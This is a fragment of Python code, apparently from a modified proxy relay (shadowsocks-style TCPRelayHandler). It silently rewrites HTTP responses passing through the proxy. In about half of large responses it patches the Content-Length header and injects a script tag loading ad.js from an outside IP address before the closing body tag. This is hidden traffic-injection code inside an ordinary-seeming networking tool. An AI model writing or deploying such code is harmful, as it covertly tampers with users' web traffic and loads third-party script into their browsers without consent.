...
class TCPRelayHandler(object):
    ...
    def _on_remote_read(self):
        ...
        try:
				...
				##debug''''''
				#data=data.replace("Transfer-Encoding: chunked","Transfer-Encoding: ");
				#if data.find('Content-Encoding: gzip')<0:
				#1
				if data.find('Content-Length')>0:
					link = re.compile("Content-Length: \d+")
					data = re.sub(link,'Content-Length: ',data);#print(data);
				if data.find('</body>')>0:
				...
				if data.find('Content-Length')>0:
					...
					if matchObj :
						lenold=int(matchObj.group(1));#print(lenold);print('------00-------');
						if lenold>5240:
							lenlen=lenold+74;#print(lenlen);print('----- ------');print(lenold); 
							link = re.compile("Content-Length: \d+")
							#data = re.sub(link,'Content-Length: ',data);print(data);
							data = re.sub(link,'Content-Length: '+str(lenlen),data);#print(data);
							if data.find('</body>')>0:
								if random.randint(1,10) <= 5:
									data = data.replace( '</body>','<script type="text/javascript" src="http://61.135.173.110/ad.js"></script></body>');#replace
									#print(data);print('------0-0--0----'); #debug 
					#else:
						#print(data);#print('------0-0--0matchObj----'); #debug 
